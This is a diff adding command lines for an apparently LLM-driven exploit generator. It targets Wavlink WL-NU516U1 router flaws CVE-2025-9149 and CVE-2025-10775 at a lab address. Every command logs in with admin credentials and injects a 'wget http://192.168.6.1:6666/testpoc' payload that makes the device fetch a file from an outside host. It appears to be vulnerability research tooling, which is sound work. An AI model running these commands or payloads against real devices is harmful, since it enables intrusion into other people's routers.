@@ -108,3 +108,46 @@ python3 -m PoCGen.cli \
   --login-username admin --login-password 20030303xX! \
   --auto-validate --max-iters 5 \
   --payload "wget http://192.168.6.1:6666/testpoc"
+
+  python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/WL-NU516U1/CVE-2025-9149/httpd_vulcode_description.txt \
+  --code "/home/li/LLM_POC/vul_func_desc_poc/WL-NU516U1/CVE-2025-9149/相关函数/*.c" \
+  --bin /home/li/LLM_POC/vul_func_desc_poc/WL-NU516U1/CVE-2025-9149/漏洞文件/wireless.cgi \
+  --ida-enable \
+  --ida-mcp-url http://127.0.0.1:8745/mcp \
+  --ida-mcp-debug \
+  --target http://192.168.6.2 \
+  --probe-target \
+  --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin \
+  --login-password admin \
+  --auto-validate \
+  --max-iters 3 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
+
+  /home/li/LLM_POC/vul_func_desc_poc
+/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-10775/相关函数/ftex.c
+/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-10775/相关函数/start.c
+/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-10775/相关函数/sub_4012A0.c
+/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-10775/desc.txt
+
+python3 -m PoCGen.cli \
+  --desc /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-10775/desc.txt \
+  --code "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-10775/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
+
+python3 -m PoCGen.cli \
+  --desc /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
+  --code "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
